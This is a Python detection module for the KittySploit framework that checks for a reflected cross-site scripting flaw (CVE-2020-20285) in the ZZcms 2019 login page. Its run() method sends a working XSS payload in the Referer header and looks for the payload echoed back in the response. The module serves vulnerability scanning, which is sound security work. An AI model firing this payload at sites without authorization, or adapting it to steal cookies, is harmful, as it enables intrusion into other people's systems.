#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ZZcms 2019 contains a cross-site scripting vulnerability in the user login page."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ZZcms - Cross-Site Scripting Detection',
        'description': 'ZZcms 2019 contains a cross-site scripting vulnerability in the user login page. An attacker can inject arbitrary JavaScript code in the referer header via user/login.php, which can allow theft of cookie-based credentials and launch of subsequent attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2020', 'cve', 'zzcms', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/iohex/ZZCMS/blob/master/zzcms2019_login_xss.md',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-20285',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2020-20285',
    }

    def run(self):
        path = '/user/login.php'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Referer': 'xss"/><img src="#" onerror="alert(document.domain)"/>'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('fromurl" type="hidden" value="xss"/><img src="#" onerror="alert(document.domain)"/>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='ZZcms - Cross-Site Scripting detected', path=path)
            return True
        return False

